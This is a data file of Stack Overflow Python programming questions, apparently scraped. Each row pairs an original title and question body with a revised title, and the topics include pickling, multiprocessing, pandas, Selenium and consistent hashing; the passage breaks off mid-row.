Python:How to use nose's assert_raises?," I've searched for documentation, but couldn't find any. There were a couple that didn't explain much.Can someone explain to me Nose's function and how to use it? <code>  assert_raises(what should I put here?)",How to use nose's assert_raises?
Casting string to type," Recently, I was trying to store and read information from files in Python, and came across a slight problem: I wanted to read type information from text files. Type casting from string to int or to float is quite efficient, but type casting from string to type seems to be another problem. Naturally, I tried something like this: However, type isn't used as a cast but as a mechanism to find the type of the variable, which is actually str here.I found a way to do it with: But I generally try to avoid functions/statements like eval or exec where I can. So my question is the following: Is there another pythonic (and more specific) way to cast a string to a type? <code>  var_type = type('int') var_type = eval('int')",Lexical cast from string to type
run a python script from c#," This sort of question has been asked before in varying degrees, but I feel it has not been answered in a concise way and so I ask it again.I want to run a script in Python. Let's say it's this: Which gets a file location, reads it, then prints its contents. Not so complicated.Okay, so how do I run this in C#?This is what I have now: When I pass the code.py location as cmd and the filename location as args it doesn't work. I was told I should pass python.exe as the cmd, and then code.py filename as the args.I have been looking for a while now and can only find people suggesting to use IronPython or such. But there must be a way to call a Python script from C#.Some clarification:I need to run it from C#, I need to capture the output, and I can't use IronPython or anything else. Whatever hack you have will be fine.P.S.: The actual Python code I'm running is much more complex than this, and it returns output which I need in C#, and the C# code will be constantly calling the Python code.Pretend this is my code: <code>  if __name__ == '__main__': with open(sys.argv[1], 'r') as f: s = f.read() print s private void run_cmd(string cmd, string args) { ProcessStartInfo start = new ProcessStartInfo(); start.FileName = cmd; start.Arguments = args; start.UseShellExecute = false; start.RedirectStandardOutput = true; using (Process process = Process.Start(start)) { using (StreamReader reader = process.StandardOutput) { string result = reader.ReadToEnd(); Console.Write(result); } } } private void get_vals() { for (int i = 0; i < 100; i++) { run_cmd(""code.py"", i); } }",How do I run a Python script from C#?
How to run a python script from c#?," This sort of question has been asked before in varying degrees, but I feel it has not been answered in a concise way and so I ask it again.I want to run a script in Python. Let's say it's this: Which gets a file location, reads it, then prints its contents. Not so complicated.Okay, so how do I run this in C#?This is what I have now: When I pass the code.py location as cmd and the filename location as args it doesn't work. I was told I should pass python.exe as the cmd, and then code.py filename as the args.I have been looking for a while now and can only find people suggesting to use IronPython or such. But there must be a way to call a Python script from C#.Some clarification:I need to run it from C#, I need to capture the output, and I can't use IronPython or anything else. Whatever hack you have will be fine.P.S.: The actual Python code I'm running is much more complex than this, and it returns output which I need in C#, and the C# code will be constantly calling the Python code.Pretend this is my code: <code>  if __name__ == '__main__': with open(sys.argv[1], 'r') as f: s = f.read() print s private void run_cmd(string cmd, string args) { ProcessStartInfo start = new ProcessStartInfo(); start.FileName = cmd; start.Arguments = args; start.UseShellExecute = false; start.RedirectStandardOutput = true; using (Process process = Process.Start(start)) { using (StreamReader reader = process.StandardOutput) { string result = reader.ReadToEnd(); Console.Write(result); } } } private void get_vals() { for (int i = 0; i < 100; i++) { run_cmd(""code.py"", i); } }",How do I run a Python script from C#?
How to overwrite the dump/load methods in the pickle class - Python," So far, what I've done is this: In my main method, this is mainly what I have However, this is giving me the following error when the super method is called:TypeError: must be type, not classobjHow does one overwrite only the two methods, load and dump? The pickle file is under C:\Python27/lib/pickle.py EDITThe enum.py file can be found here: http://dpaste.com/780897/Object details:Object is initialized like this: And CellSizeRelation is a class that uses the Enumeration: Before I pickle object, I do this: output After I unpickle and print out the same thing, I get this output: The problem is that the second object address changes; When initialized the first time, the enumtype and _values have the same address. However, after unpickling, they change addresses. This breaks my code when I try to compare two enumValues. If you look in the enumValue class, the compare function tries to do this: Because the address changes, the assert function fails. I now somehow need to ensure that the address for the enumtype does not change when unpickled. I was thinking of simply getting the value 'FIRST' from the unpickled file, finding out its index, and reinitializing the object with: <code>  import pickleclass MyPickler(pickle.Pickler): def __init__(self, file, protocol=None): super(MyPickler, self).__init__(file, protocol)class MyUnpickler(pickle.Unpickler): def __init__(self, file): super(MyUnpickler, self).__init__(file) #created object, then... pickledObject = 'testing.pickle'with open(pickledObject,'wb') as f: pickle = MyPickler(f) pickle.dump(object) #object is the object I want to pickle, created before thiswith open(pickledObject, 'r') as pickledFile: unpickle = MyUnpickler(pickledFile) object2 = unpickle.load() object = CellSizeRelation(CellSizeRelation.Values.FIRST) class CellSizeRelation(Option): Values = enum.Enum('FIRST', 'SECOND') print object.Values._values print object.value.enumtype [EnumValue(<enum.Enum object at 0x02E80E50>, 0, 'FIRST'), EnumValue(<enum.Enum object at 0x02E80E50>, 1, 'SECOND')<enum.Enum object at 0x02E80E50> [EnumValue(<enum.Enum object at 0x02E80E50>, 0, 'FIRST'), EnumValue(<enum.Enum object at 0x02E80E50>, 1, 'SECOND')<enum.Enum object at 0x02ECF750> try: assert self.enumtype == other.enumtype result = cmp(self.index, other.index) def load: object = CellSizeRelation(CellSizeRelation.Values[INDEX]) return object",How to overwrite the dump/load methods in the pickle class - customizing pickling and unpickling - Python
"Weird ""object of type 'NoneType' has no len()"" error"," I'm seeing weird behavior on this code: My web2py app gives me this error: I can't figure out what's wrong in this. Maybe some scope issue? <code>  images = dict(cover=[],second_row=[],additional_rows=[])for pic in pictures: if len(images['cover']) == 0: images['cover'] = pic.path_thumb_l elif len(images['second_row']) < 3: images['second_row'].append(pic.path_thumb_m) else: images['additional_rows'].append(pic.path_thumb_s) if len(images['cover']) == 0:TypeError: object of type 'NoneType' has no len()","""object of type 'NoneType' has no len()"" error"
Get size of an unicode string," I have a Korean string encoded as Unicode like u''. How do I know how many bytes are needed to represent this string?I need to know the exact byte count since I'm using the string for iOS push notification and it has a limit on the size of the payload.len('') doesn't work because that returns the number of characters, not the number of bytes. <code> ",Get the number of bytes needed for a Unicode string
get number of bytes needed for a unicode string," I have a Korean string encoded as Unicode like u''. How do I know how many bytes are needed to represent this string?I need to know the exact byte count since I'm using the string for iOS push notification and it has a limit on the size of the payload.len('') doesn't work because that returns the number of characters, not the number of bytes. <code> ",Get the number of bytes needed for a Unicode string
python if statement with variable mathematical operator," I'm trying to insert a variable mathematical operator into a if statement, an example of what I'm trying to achieve in parsing user-supplied mathematical expressions: obviously the above fails with SyntaxError: invalid syntax. I've tried using exec and eval but neither work in an if statement, what options do I have to get around this? <code>  maths_operator = ""==""if ""test"" maths_operator ""test"": print ""match found""maths_operator = ""!=""if ""test"" maths_operator ""test"": print ""match found""else: print ""match not found""",Python if-statement with variable mathematical operator
python multiprocessing: some functions do not return when they are complete," I am using multiprocessing's Process and Queue.I start several functions in parallel and most behave nicely: they finish, their output goes to their Queue, and they show up as .is_alive() == False. But for some reason a couple of functions are not behaving. They always show .is_alive() == True, even after the last line in the function (a print statement saying ""Finished"") is complete. This happens regardless of the set of functions I launch, even it there's only one. If not run in parallel, the functions behave fine and return normally. What kind of thing might be the problem? Here's the generic function I'm using to manage the jobs. All I'm not showing is the functions I'm passing to it. They're long, often use matplotlib, sometimes launch some shell commands, but I cannot figure out what the failing ones have in common. <code>  def runFunctionsInParallel(listOf_FuncAndArgLists): """""" Take a list of lists like [function, arg1, arg2, ...]. Run those functions in parallel, wait for them all to finish, and return the list of their return values, in order. """""" from multiprocessing import Process, Queue def storeOutputFFF(fff,theArgs,que): #add a argument to function for assigning a queue print 'MULTIPROCESSING: Launching %s in parallel '%fff.func_name que.put(fff(*theArgs)) #we're putting return value into queue print 'MULTIPROCESSING: Finished %s in parallel! '%fff.func_name # We get this far even for ""bad"" functions return queues=[Queue() for fff in listOf_FuncAndArgLists] #create a queue object for each function jobs = [Process(target=storeOutputFFF,args=[funcArgs[0],funcArgs[1:],queues[iii]]) for iii,funcArgs in enumerate(listOf_FuncAndArgLists)] for job in jobs: job.start() # Launch them all import time from math import sqrt n=1 while any([jj.is_alive() for jj in jobs]): # debugging section shows progress updates n+=1 time.sleep(5+sqrt(n)) # Wait a while before next update. Slow down updates for really long runs. print('\n---------------------------------------------------\n'+ '\t'.join(['alive?','Job','exitcode','Func',])+ '\n---------------------------------------------------') print('\n'.join(['%s:\t%s:\t%s:\t%s'%(job.is_alive()*'Yes',job.name,job.exitcode,listOf_FuncAndArgLists[ii][0].func_name) for ii,job in enumerate(jobs)])) print('---------------------------------------------------\n') # I never get to the following line when one of the ""bad"" functions is running. for job in jobs: job.join() # Wait for them all to finish... Hm, Is this needed to get at the Queues? # And now, collect all the outputs: return([queue.get() for queue in queues])",python multiprocessing: some functions do not return when they are complete (queue material too big)
display an image from a file in an ipython notebook," I would like to use an IPython notebook as a way to interactively analyze some genome charts I am making with Biopython's GenomeDiagram module. While there is extensive documentation on how to use matplotlib to get graphs inline in IPython notebook, GenomeDiagram uses the ReportLab toolkit which I don't think is supported for inline graphing in IPython. I was thinking, however, that a way around this would be to write out the plot/genome diagram to a file and then open the image inline which would have the same result with something like this: However, I can't figure out how to do this - or know if it's possible. So does anyone know if images can be opened/displayed in IPython? <code>  gd_diagram.write(""test.png"", ""PNG"")display(file=""test.png"")",How can I display an image from a file in Jupyter Notebook?
Display an image from a file in an IPython Notebook," I would like to use an IPython notebook as a way to interactively analyze some genome charts I am making with Biopython's GenomeDiagram module. While there is extensive documentation on how to use matplotlib to get graphs inline in IPython notebook, GenomeDiagram uses the ReportLab toolkit which I don't think is supported for inline graphing in IPython. I was thinking, however, that a way around this would be to write out the plot/genome diagram to a file and then open the image inline which would have the same result with something like this: However, I can't figure out how to do this - or know if it's possible. So does anyone know if images can be opened/displayed in IPython? <code>  gd_diagram.write(""test.png"", ""PNG"")display(file=""test.png"")",How can I display an image from a file in Jupyter Notebook?
wait till other python script ends," I have a python script that calls another python script. Inside the other python script it spawns some threads.How do I make the calling script wait until the called script is completely done running?This is my code : How do I wait until mod_scanProfiles.main() and all threads are completely finished? ( I used time.sleep(180) for now but its not good programming habit) <code>  while(len(mProfiles) < num): print distro + "" "" + str(len(mProfiles)) mod_scanProfiles.main(distro) time.sleep(180) mProfiles = readProfiles(mFile,num,distro) print ""yoyo""",Wait until nested python script ends before continuing in current python script
"How to timeout function in python, timout less than a second"," Specification of the problem:I'm searching through really great amount of lines of a log file and I'm distributing those lines to groups in order to regular expressions(RegExses) I have stored using the re.match() function. Unfortunately some of my RegExses are too complicated and Python sometimes gets himself to backtracking hell. Due to this I need to protect it with some kind of timeout.Problems:re.match, I'm using, is Python's function and as I found out somewhere here on StackOverflow (I'm really sorry, I can not find the link now :-( ). It is very difficult to interrupt thread with running Python's library. For this reason threads are out of the game.Because evaluating of re.match function takes relatively short time and I want to analyse with this function great amount of lines, I need some timeout function that wont't take too long to execute (this makes threads even less suitable, it takes really long time to initialise new thread) and can be set to less than one second.For those reasons, answers here - Timeout on a function calland here - Timeout function if it takes too long to finish with decorator (alarm - 1sec and more) are off the table.I've spent this morning searching for solution to this question but I did not find any satisfactory answer. <code> ","How to timeout function in python, timeout less than a second"
Python: Change values in dict of nested dicts using items in a list," How would you modify/create keys/values in a dict of nested dicts based on the values of a list, in which the last item of the list is a value for the dict, and the rest of items reefer to keys within dicts?This would be the list: This would only be a problem in situations like when parsing command line arguments. It's obvious that modifying/creating this value within a script would be pretty easy using dict_nested[""key1""][""key1.2""][""key1.2.1""][""value""].This would be a nested dict of dicts: I guess that in this case, something like a recursive function or a list comprehension would be required. Also, if items in list_address would reefer to keys in non-existing dictionaries, they should be created. <code>  list_adddress = [ ""key1"", ""key1.2"", ""key1.2.1"", ""value"" ] dict_nested = { ""key1"": { ""key1.1"": { ""..."": ""..."", }, ""key1.2"": { ""key1.2.1"": ""change_this"", }, }, ""key2"": { ""..."": ""..."" },} def ValueModify(list_address, dict_nested): ... ... ValueModify(..., ...)",Change values in dict of nested dicts using items in a list?
i want to remove lines that contain certain string," I'm trying to read a text from a text file, read lines, delete lines that contain specific string (in this case 'bad' and 'naughty').The code I wrote goes like this: I wrote like this but it doesn't work out.One thing important is, if the content of the text was like this: I don't want the output to have empty lines.so not like: but like this: What should I edit from my code on the above? <code>  infile = file('./oldfile.txt')newopen = open('./newfile.txt', 'w')for line in infile : if 'bad' in line: line = line.replace('.' , '') if 'naughty' in line: line = line.replace('.', '') else: newopen.write(line)newopen.close() good babybad boygood boynormal boy good babygood boynormal boy good babygood boynormal boy",Remove lines that contain certain string
Does the eclipse have the indentation guides?," Recently, I use Eclipse to edit my python code. But lacking indentation guides, I feel not very well. So how to add the auto indentation guides for Eclipse? Is there certain plugin?What's more, I have tried the EditBox. But, you know, that is not very natural under some themes............... <code> ",Does Eclipse have indentation guides?
Python: Pandas Divide DataFrame by first row," I have checked the documentation. I don't understand the way to index a Pandas DataFrame.I would like to divide a DataFrame of stock prices by their respective initial values to index the different stocks to 100. I want to compare their performance. The DataFrame looks like this: I have stuff like this, but it's not getting me anywhere. <code>  >>> IndexPrices<class 'pandas.core.frame.DataFrame'>DatetimeIndex: 157 entries, 1999-12-31 00:00:00 to 2012-12-31 00:00:00Freq: MData columns:MSCI WORLD :G U$ 148 non-null valuesS&P 500 COMPOSITE 148 non-null valuesDAX 30 PERFORMANCE 148 non-null valuesRUSSELL 2000 148 non-null valuesFTSE 100 148 non-null valuesUS Treasury Bond Yields 30 Year Bond 148 non-null valuesdtypes: float64(6) IndexPrices.divide(IndexPrices[0:1])",Divide DataFrame by first row
Selenium and python to find elements and text?," When I go to a certain webpage I am trying to find a certain element and piece of text: This didn't work: (It gave an error of compound class names...) So I tried this: (but I'm not sure it worked because I don't really understand the right way to do css selectors in selenium...) Once I find the span element, I want to find the number that is inside (the content). Any help with CSS selectors, class names, and finding element text would be great!Thanks.Oh! and my other problem is that there are multiple of those exact span elements but with different numbers inside. How can I deal with that? <code>  <span class=""Bold Orange Large"">0</span> elem = browser.find_elements_by_class_name(""Bold Orange Large"") elem = browser.find_elements_by_css_selector(""span[class='Bold Orange Large']"") num = elem.(what to put here??)",Selenium and Python to find elements and text?
"Does, With open() not works with python 2.6"," I am trying to use ""With open()"" with python 2.6 and it is giving error(Syntax error) while it works fine with python 2.7.3Am I missing something or some import to make my program work!Any help would be appreciated.BrMy code is here: <code>  def compare_some_text_of_a_file(self, exportfileTransferFolder, exportfileCheckFilesFolder) : flag = 0 error = """" with open(""check_files/""+exportfileCheckFilesFolder+"".txt"") as f1,open(""transfer-out/""+exportfileTransferFolder) as f2: if f1.read().strip() in f2.read(): print """" else: flag = 1 error = exportfileCheckFilesFolder error = ""Data of file "" + error + "" do not match with exported data\n"" if flag == 1: raise AssertionError(error)","Does ""with open()"" not work with Python 2.6?"
How to get all children of queryset in djano?," I've a queryset result, say, animals, which has a list of animals. There are sub categories of animals and I want to get all the subcategories. i.e.for single animal, I can use animal.categories which works. Now, I want to somehow do this: where animals is queryset. How can I achieve this? <code>  categories = animals.categories",How to get all children of queryset in django?
Setting folder permissions in Windows using Python, I'm using Python to create a new personal folder when a users AD account is created. The folder is being created but the permissions are not correct. Can Python add the user to the newly created folder and change their permissions? I'm not sure where to begin coding this. <code> ,How to set folder permissions in Windows?
Daylight savings time in python," I am writing a program which deals a lot with timezones and crossing them. The two things I deal with most are creating a datetime object from ""now"" and then localizing a naive datetime object.To create a datetime object from now in the pacific timezone, I am currently doing this (python 2.7.2+) Is this correct with regards to DST? If not, I suppose I should be doing: My question is why? Can anyone show me a case where the first is wrong and the seconds is right?As for my seconds question, suppose I had a naive date and time from some user input for 9/1/2012 at 8:00am in Los Angeles, CA. Is the right way to make the datetime like this: If not, how should I be building these datetimes? <code>  from datetime import datetimeimport pytzla = pytz.timezone(""America/Los_Angeles"")now = datetime.now(la) now2 = la.localize(datetime.now()) la.localize(datetime(2012, 9, 1, 8, 0))",Daylight savings time in Python
bad magic number while trying to import .pyc module," I have some problems while trying to import some module (compiled .pyc) in my program. I know that it compiled in Python 2.6.6 (r266:84297), I have installed the same version, but had an error ""bad magic number"" while trying to import it :(Does anybody know what I did wrong?Or maybe it's possible to change magic number in .pyc module? <code> ",Bad magic number while trying to import .pyc module
R function rep() in Pyhton (replicates elements of a list/vector)," The R function rep() replicates each element of a vector: This is like the list multiplication in Python: But with the rep() R function it is also possible to specifiy the number of repeats for each element of the vector: Is there such a function availbale in Python ? Otherwise how could one define it ? By the way I'm also interested in such a function for duplicating rows of an array. <code>  > rep(c(""A"",""B""), times=2)[1] ""A"" ""B"" ""A"" ""B"" >>> [""A"",""B""]*2['A', 'B', 'A', 'B'] > rep(c(""A"",""B""), times=c(2,3))[1] ""A"" ""A"" ""B"" ""B"" ""B""",R function rep() in Python (replicates elements of a list/vector)
Share data between requests in Tornado Web," I have the following use case for my Tornado web server:Upon POST requests entries can be made to the server, entries which will not be persisted to a file or database. Upon GET requests a process can be started or terminated.Hence I need to share data between different requests in my RequestHandler implementation. What is the normal way to do so?I had difficulties saving data to self, for instance self.entry = ""..."". In another request the data was not present anymore.The only working solution I've found is to store that in the application object: and Is that the proper way? Also what about synchronization here, I mean this means access to shared data. <code>  application = web.Application([ (r'.*', MainHandler, ]) def get(self): # ... self.application.entry = ""...""",How to share data between requests in Tornado Web
Use of lamda in the folowing expression," While going developing OpenERP, I found the following piece of code 'app_date': lambda *a: time.strftime('%Y-%m-%d')I know what lambda is.My question is why use lambda?Why not just'app_date': time.strftime('%Y-%m-%d') <code> ",Use of lambda in the following expression
Use of lambda in the folowing expression," While going developing OpenERP, I found the following piece of code 'app_date': lambda *a: time.strftime('%Y-%m-%d')I know what lambda is.My question is why use lambda?Why not just'app_date': time.strftime('%Y-%m-%d') <code> ",Use of lambda in the following expression
Python: urllib2 urlopen to get content bytes," Still working my way round python whenever work permits it...I'm querying a load of internal webUI's using a script that uses urllib2.urlopen. I'm wondering how it is possible to get the size of the page content from each request. I can't seem to figure this one out.Thanks in advance,MHibbin <code> ",urllib2.urlopen(): getting the size of the content
Split a tuple of tuples (or list of lists) into independent complete sets?," I have paired values in a csv file. Neither of the paired values are necessarily unique. I would like to split this large list into independent complete sets for further analysis.To illustrate, my ""megalist"" is like: Most importantly, the output would preserve the list of paired values (i.e., not consolidate the values). Ideally, the output would eventually result in different csv files for individual analysis later. For example, this megalist would be: In a graph theory context, I'm trying to take a giant graph of mutually exclusive subgraphs (where the paired values are connected vertices) and split them into independent graphs that are more manageable. Thanks for any input!Edit 1: This put me in a place from which I can move forward. Thanks again! <code>  megalist = [['a', 'b'], ['a', 'd'], ['b', 'd'],['b', 'f'], ['r', 's'], ['t', 'r']...] completeset1 = [['a', 'b'], ['a', 'd'], ['b', 'd'], ['b', 'f']]completeset2 = [['r', 's'], ['t', 'r']]... import sys, csvimport networkx as nxmegalist = csv.reader(open('megalistfile.csv'), delimiter = '\t')G = nx.Graph()G.add_edges_from(megalist)subgraphs = nx.connected_components(G)output_file = open('subgraphs.txt','w')for subgraph in subgraphs: output_line = str(G.edges(subgraph)) + '\n' output_file.write(output_line)output_file.close()",Split a tuple of tuples (or list of lists) of paired values into independent complete sets?
Calculate speed from distance in Pandas.DataFrame using something similar to numpy.diff," I am very new to Pandas but familiar with Numpy and Python.Supposing I have a `Pandas.DataFrame' of X,Y points (float64) indexed by time (datetime), how can I pythonically calculate speeds from that, providing I already know how to calculate euclidean distances between points?EDIT: I have just read the help on pandas.Series.diff(), but still I'd like to ""replace"" the subtraction used on diff by another function, say `euclidean_distance()'. Is there a way to do that?DataFrame looks like (index in first column, positions in second): What I want is some way to get speeds from that, providing the speed of first data sample will always be zero by definition (no known timedelta from a previous sample).Thanks a lot! <code>  2009-08-07 16:16:44 [37.800185, -122.426361]2009-08-07 16:16:48 [37.800214, -122.426153]2009-08-07 16:16:49 [37.800222, -122.426118]2009-08-07 16:16:52 [37.800197, -122.426072]2009-08-07 16:17:32 [37.800214, -122.425903]2009-08-07 16:17:34 [37.800236, -122.425826]2009-08-07 16:17:40 [37.800282, -122.425534]2009-08-07 16:17:44 [37.800307, -122.425315]2009-08-07 16:17:46 [37.800324, -122.425207]2009-08-07 16:17:47 [37.800331, -122.425153]2009-08-07 16:17:49 [37.800343, -122.425047]2009-08-07 16:17:50 [37.800355, -122.424994]2009-08-07 16:17:51 [37.800362, -122.424942]2009-08-07 16:17:54 [37.800378, -122.424796]2009-08-07 16:17:56 [37.800357, -122.424764]",Calculate speed from timestamped positions in Pandas.DataFrame
Calculate speed from distance in Pandas.DataFrame," I am very new to Pandas but familiar with Numpy and Python.Supposing I have a `Pandas.DataFrame' of X,Y points (float64) indexed by time (datetime), how can I pythonically calculate speeds from that, providing I already know how to calculate euclidean distances between points?EDIT: I have just read the help on pandas.Series.diff(), but still I'd like to ""replace"" the subtraction used on diff by another function, say `euclidean_distance()'. Is there a way to do that?DataFrame looks like (index in first column, positions in second): What I want is some way to get speeds from that, providing the speed of first data sample will always be zero by definition (no known timedelta from a previous sample).Thanks a lot! <code>  2009-08-07 16:16:44 [37.800185, -122.426361]2009-08-07 16:16:48 [37.800214, -122.426153]2009-08-07 16:16:49 [37.800222, -122.426118]2009-08-07 16:16:52 [37.800197, -122.426072]2009-08-07 16:17:32 [37.800214, -122.425903]2009-08-07 16:17:34 [37.800236, -122.425826]2009-08-07 16:17:40 [37.800282, -122.425534]2009-08-07 16:17:44 [37.800307, -122.425315]2009-08-07 16:17:46 [37.800324, -122.425207]2009-08-07 16:17:47 [37.800331, -122.425153]2009-08-07 16:17:49 [37.800343, -122.425047]2009-08-07 16:17:50 [37.800355, -122.424994]2009-08-07 16:17:51 [37.800362, -122.424942]2009-08-07 16:17:54 [37.800378, -122.424796]2009-08-07 16:17:56 [37.800357, -122.424764]",Calculate speed from timestamped positions in Pandas.DataFrame
How can i check the version of the python API at compile time?," I am writing a python module in C.The module needs to be compiled for python version 2.4, 2.5, 2.6 and 2.7.Now I ran in to the problem that in python 2.5 they defined Py_ssize_t for the size of lists, but in 2.4 they just used int.So my question is:Is there an easy way to check if I'm using the API of version 2.4 or 2.5 at compile time so I can write a little macro?e.g: <code>  #if PY_MINOR < 5typedef int Py_ssize_t;#endif",How to check the version of the python API at compile time from a C extension module?
How can I check the version of the python API at compile time?," I am writing a python module in C.The module needs to be compiled for python version 2.4, 2.5, 2.6 and 2.7.Now I ran in to the problem that in python 2.5 they defined Py_ssize_t for the size of lists, but in 2.4 they just used int.So my question is:Is there an easy way to check if I'm using the API of version 2.4 or 2.5 at compile time so I can write a little macro?e.g: <code>  #if PY_MINOR < 5typedef int Py_ssize_t;#endif",How to check the version of the python API at compile time from a C extension module?
Python JSON get values," While I am trying to retrieve values from JSON string, it gives me an error: But, if I iterate over the data, it gives me the elements (lat and lon), but not the values: Which returns: lat lonWhat do I need to do to get the values of lat and lon? (444 and 555) <code>  data = json.loads('{""lat"":444, ""lon"":555}')return data[""lat""] data = json.loads('{""lat"":444, ""lon"":555}') ret = '' for j in data: ret = ret + ' ' + jreturn ret",Getting values from JSON using Python
getting values from JSON using Python," While I am trying to retrieve values from JSON string, it gives me an error: But, if I iterate over the data, it gives me the elements (lat and lon), but not the values: Which returns: lat lonWhat do I need to do to get the values of lat and lon? (444 and 555) <code>  data = json.loads('{""lat"":444, ""lon"":555}')return data[""lat""] data = json.loads('{""lat"":444, ""lon"":555}') ret = '' for j in data: ret = ret + ' ' + jreturn ret",Getting values from JSON using Python
Same consistent hashing implementation for Java and Python program," We have an app that the Python module will write data to redis shards and the Java module will read data from redis shards, so I need to implement the exact same consistent hashing algorithm for Java and Python to make sure the data can be found.I googled around and tried several implementations, but found the Java and Python implementations are always different, can't be used togather. Need your help.Edit, online implementations I have tried: Java: http://weblogs.java.net/blog/tomwhite/archive/2007/11/consistent_hash.html Python: http://techspot.zzzeek.org/2012/07/07/the-absolutely-simplest-consistent-hashing-example/ http://amix.dk/blog/post/19367 Edit, attached Java (Google Guava lib used) and Python code I wrote. Code are based on the above articles. Test code: Python code: Test code: <code>  import java.util.Collection;import java.util.SortedMap;import java.util.TreeMap;import com.google.common.hash.HashFunction;public class ConsistentHash<T> { private final HashFunction hashFunction; private final int numberOfReplicas; private final SortedMap<Long, T> circle = new TreeMap<Long, T>(); public ConsistentHash(HashFunction hashFunction, int numberOfReplicas, Collection<T> nodes) { this.hashFunction = hashFunction; this.numberOfReplicas = numberOfReplicas; for (T node : nodes) { add(node); } } public void add(T node) { for (int i = 0; i < numberOfReplicas; i++) { circle.put(hashFunction.hashString(node.toString() + i).asLong(), node); } } public void remove(T node) { for (int i = 0; i < numberOfReplicas; i++) { circle.remove(hashFunction.hashString(node.toString() + i).asLong()); } } public T get(Object key) { if (circle.isEmpty()) { return null; } long hash = hashFunction.hashString(key.toString()).asLong(); if (!circle.containsKey(hash)) { SortedMap<Long, T> tailMap = circle.tailMap(hash); hash = tailMap.isEmpty() ? circle.firstKey() : tailMap.firstKey(); } return circle.get(hash); }} ArrayList<String> al = new ArrayList<String>(); al.add(""redis1""); al.add(""redis2""); al.add(""redis3""); al.add(""redis4""); String[] userIds = {""-84942321036308"", ""-76029520310209"", ""-68343931116147"", ""-54921760962352"" }; HashFunction hf = Hashing.md5(); ConsistentHash<String> consistentHash = new ConsistentHash<String>(hf, 100, al); for (String userId : userIds) { System.out.println(consistentHash.get(userId)); } import bisectimport md5class ConsistentHashRing(object): """"""Implement a consistent hashing ring."""""" def __init__(self, replicas=100): """"""Create a new ConsistentHashRing. :param replicas: number of replicas. """""" self.replicas = replicas self._keys = [] self._nodes = {} def _hash(self, key): """"""Given a string key, return a hash value."""""" return long(md5.md5(key).hexdigest(), 16) def _repl_iterator(self, nodename): """"""Given a node name, return an iterable of replica hashes."""""" return (self._hash(""%s%s"" % (nodename, i)) for i in xrange(self.replicas)) def __setitem__(self, nodename, node): """"""Add a node, given its name. The given nodename is hashed among the number of replicas. """""" for hash_ in self._repl_iterator(nodename): if hash_ in self._nodes: raise ValueError(""Node name %r is "" ""already present"" % nodename) self._nodes[hash_] = node bisect.insort(self._keys, hash_) def __delitem__(self, nodename): """"""Remove a node, given its name."""""" for hash_ in self._repl_iterator(nodename): # will raise KeyError for nonexistent node name del self._nodes[hash_] index = bisect.bisect_left(self._keys, hash_) del self._keys[index] def __getitem__(self, key): """"""Return a node, given a key. The node replica with a hash value nearest but not less than that of the given name is returned. If the hash of the given name is greater than the greatest hash, returns the lowest hashed node. """""" hash_ = self._hash(key) start = bisect.bisect(self._keys, hash_) if start == len(self._keys): start = 0 return self._nodes[self._keys[start]] import ConsistentHashRingif __name__ == '__main__': server_infos = [""redis1"", ""redis2"", ""redis3"", ""redis4""]; hash_ring = ConsistentHashRing() test_keys = [""-84942321036308"", ""-76029520310209"", ""-68343931116147"", ""-54921760962352"", ""-53401599829545"" ]; for server in server_infos: hash_ring[server] = server for key in test_keys: print str(hash_ring[key])",Same consistent-hashing algorithm implementation for Java and Python program
python os.system try," I have this python code: The code prints: Instead of command does not work. Does anyone know why it's not printing my error message? <code>  import ostry: os.system('wrongcommand')except: print(""command does not work"") wrongcommand: command not found",Python try block does not catch os.system exceptions
Python - not working try on os.system()," I have this python code: The code prints: Instead of command does not work. Does anyone know why it's not printing my error message? <code>  import ostry: os.system('wrongcommand')except: print(""command does not work"") wrongcommand: command not found",Python try block does not catch os.system exceptions
Optimazing polynomial implementation," I'm trying to optimize a polynomial implementation of mine. In particular I'm dealing with polynomials with coefficients modulo n(might be >2^64) and modulo a polynomial in the form x^r - 1(r is < 2^64). At the moment I represent the coefficient as a list of integers(*) and I've implemented all the basic operations in the most straightforward way.I'd like the exponentiation and multiplication to be as fast as possible, and to obtain this I've already tried different approaches. My current approach is to convert the lists of coefficients into huge integers multiply the integers and unpack back the coefficients.The problem is that packing and unpacking takes a lot of time.So, is there a way of improving my ""pack/unpack"" functions? Note that I do not choose n, it is an input from the user, and my program wants to prove its primality(using the AKS test), so I can't factorize it.(*) I've tried several approaches:Using a numpy array instead of a list and multiply using numpy.convolve. It's fast for n < 2^64 but terribly slow for n > 2^64[also I'd like to avoid using external libraries]Using scipy.fftconvolve. Doesn't work at all for n > 2^64.Represent the coefficients as integers from the start(without converting them every time). The problem is that I don't know of an easy way to do the mod x^r -1 operation without converting the integer to a list of coefficients(which defeats the reason of using this representation). <code>  def _coefs_to_long(coefs, window): '''Given a sequence of coefficients *coefs* and the *window* size return a long-integer representation of these coefficients. ''' res = 0 adder = 0 for k in coefs: res += k << adder adder += window return res #for k in reversed(coefs): res = (res << window) + k is slowerdef _long_to_coefs(long_repr, window, n): '''Given a long-integer representing coefficients of size *window*, return the list of coefficients modulo *n*. ''' mask = 2**window - 1 coefs = [0] * (long_repr.bit_length() // window + 1) for i in xrange(len(coefs)): coefs[i] = (long_repr & mask) % n long_repr >>= window # assure that the returned list is never empty, and hasn't got an extra 0. if not coefs: coefs.append(0) elif not coefs[-1] and len(coefs) > 1: coefs.pop() return coefs",Optimize conversion between list of integer coefficients and its long integer representation
Optimizing polynomial implementation," I'm trying to optimize a polynomial implementation of mine. In particular I'm dealing with polynomials with coefficients modulo n(might be >2^64) and modulo a polynomial in the form x^r - 1(r is < 2^64). At the moment I represent the coefficient as a list of integers(*) and I've implemented all the basic operations in the most straightforward way.I'd like the exponentiation and multiplication to be as fast as possible, and to obtain this I've already tried different approaches. My current approach is to convert the lists of coefficients into huge integers multiply the integers and unpack back the coefficients.The problem is that packing and unpacking takes a lot of time.So, is there a way of improving my ""pack/unpack"" functions? Note that I do not choose n, it is an input from the user, and my program wants to prove its primality(using the AKS test), so I can't factorize it.(*) I've tried several approaches:Using a numpy array instead of a list and multiply using numpy.convolve. It's fast for n < 2^64 but terribly slow for n > 2^64[also I'd like to avoid using external libraries]Using scipy.fftconvolve. Doesn't work at all for n > 2^64.Represent the coefficients as integers from the start(without converting them every time). The problem is that I don't know of an easy way to do the mod x^r -1 operation without converting the integer to a list of coefficients(which defeats the reason of using this representation). <code>  def _coefs_to_long(coefs, window): '''Given a sequence of coefficients *coefs* and the *window* size return a long-integer representation of these coefficients. ''' res = 0 adder = 0 for k in coefs: res += k << adder adder += window return res #for k in reversed(coefs): res = (res << window) + k is slowerdef _long_to_coefs(long_repr, window, n): '''Given 